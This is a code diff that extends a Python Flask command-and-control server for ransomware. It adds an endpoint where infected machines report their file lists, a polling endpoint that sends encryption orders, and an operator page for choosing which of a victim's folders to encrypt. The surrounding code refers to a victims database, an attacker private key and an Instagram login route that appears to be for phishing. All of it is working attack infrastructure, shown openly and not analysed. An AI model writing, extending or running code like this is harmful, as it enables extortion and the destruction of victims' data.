@@ -18,6 +18,9 @@ C2_PORT = 5000
 # --- In-Memory "Database" ---
 # Structure: {victim_id: {status: str, encrypted_key: str, decrypted_key: str, first_seen: str, timer: int}}
 victims = {}
+# Store pending victims and their file trees
+# Structure: {'VICTIM_ID': {'files': ['/path/A', '/path/B'], 'command_queue': None}}
+recon_data = {}
 
 # --- Cryptography Setup ---
 PRIVATE_KEY_FILE = "attacker_private_key.pem"
@@ -155,6 +158,66 @@ def home():
     </html>
     """
     return render_template_string(html)
+
+@app.route('/api/recon', methods=['POST'])
+def receive_recon():
+    """Victim sends us their file list."""
+    data = request.json
+    vid = data.get('id')
+    files = data.get('files')
+    
+    recon_data[vid] = {
+        'files': files,
+        'command_queue': None, # Waiting for attacker input
+        'last_seen': datetime.datetime.now().strftime("%H:%M:%S")
+    }
+    print(f"[+] Victim {vid} is online and waiting for commands.")
+    return "OK", 200
+
+@app.route('/api/task/<vid>', methods=['GET'])
+def serve_task(vid):
+    """Victim polls this to see if we clicked 'Encrypt' yet."""
+    if vid in recon_data and recon_data[vid]['command_queue']:
+        # Send the command and clear it (so it runs once)
+        command = recon_data[vid]['command_queue']
+        # Cleanup recon data since victim is moving to encryption phase
+        del recon_data[vid] 
+        return jsonify(command)
+    return jsonify({"action": "WAIT"})
+
+# --- ATTACKER UI FOR SELECTION ---
+@app.route('/target_selection')
+def target_ui():
+    """Shows a list of waiting victims and their files."""
+    html = """
+    <h1>Waiting Victims</h1>
+    <style>body{background:#111;color:#0f0;font-family:monospace;padding:20px;}</style>
+    """
+    for vid, data in recon_data.items():
+        html += f"<h3>VICTIM: {vid} (Last Seen: {data['last_seen']})</h3>"
+        html += f"<form action='/send_command/{vid}' method='POST'>"
+        for f in data['files']:
+            # Checkbox for each folder
+            html += f"<input type='checkbox' name='targets' value='{f}'> {f}<br>"
+        html += "<br><button type='submit' style='background:red;color:white;padding:10px;'>ENCRYPT SELECTED</button>"
+        html += "</form><hr>"
+    
+    if not recon_data:
+        html += "<p>No victims waiting...</p>"
+        
+    return html
+
+@app.route('/send_command/<vid>', methods=['POST'])
+def send_command(vid):
+    """Takes your checkboxes and queues the command."""
+    targets = request.form.getlist('targets')
+    if vid in recon_data:
+        recon_data[vid]['command_queue'] = {
+            "action": "ENCRYPT",
+            "targets": targets
+        }
+        return f"Command Sent! Victim {vid} will encrypt {len(targets)} folders on next poll."
+    return "Victim lost.", 404
 
 @app.route('/instagram')
 def instagram_login():
